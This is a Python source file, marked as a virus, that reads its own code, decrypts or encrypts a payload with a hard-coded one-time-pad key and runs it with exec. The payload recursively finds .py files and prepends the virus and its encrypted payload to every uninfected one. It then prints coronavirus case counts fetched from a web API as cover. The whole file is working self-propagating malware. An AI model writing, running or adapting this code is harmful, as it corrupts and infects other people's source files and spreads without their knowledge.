### VIRUS START ###

import sys
import re
import onetimepad

currentFile = open(sys.argv[0],"r")
lines = currentFile.readlines()
currentFile.close()

payloadScript = []
payloadFlag = False

for line in lines:
    if re.search("^### PAYLOAD END ###", line):
        break
    if payloadFlag:
        payloadScript.append(line)
    if re.search("^### PAYLOAD START ###", line):
        payloadFlag = True

code = ""
encryptedCode = ""

if len(payloadScript) == 1:
    encryptedCode = payloadScript[0][1:]
    encryptedCode = encryptedCode.strip()
    code = onetimepad.decrypt(encryptedCode, "cagdas")
    exec(code)
else:
    for line in payloadScript: code += line
    encryptedCode = onetimepad.encrypt(code, "cagdas")
    exec(code)
    exit(0)

### PAYLOAD START ###

import glob
import requests

virusScript = []
virusFlag = False

for line in lines:
    if re.search("^### VIRUS START ###", line):
        virusFlag = True
    if virusFlag:
        virusScript.append(line)
    if re.search("^### PAYLOAD START ###", line):
        break

pythonFiles = glob.glob("**/*.py", recursive=True)

for file in pythonFiles:
    f = open(file, "r")
    lines = f.readlines()
    f.close()
    infected = False
    for line in lines:
        if "### VIRUS START ###" in line:
            infected = True
            break
    if not infected:
        newScript = []
        newScript += virusScript
        newScript += ["#",encryptedCode]
        newScript += ["\n### PAYLOAD END ###\n### VIRUS END ###\n"]
        newScript += lines
        f = open(file, "w")
        f.writelines(newScript)
        f.close()

response = requests.get("https://corona-stats.online/?format=json")
response = response.json()
countries = response["data"][:10]

print("\nTop 10 country with the highest coronavirus cases : \n")
for country in countries:
    print("-------------------------")
    print("| {:10} | {:8} |".format(country["country"], country["cases"]))
print("-------------------------\n")

### PAYLOAD END ###
### VIRUS END ###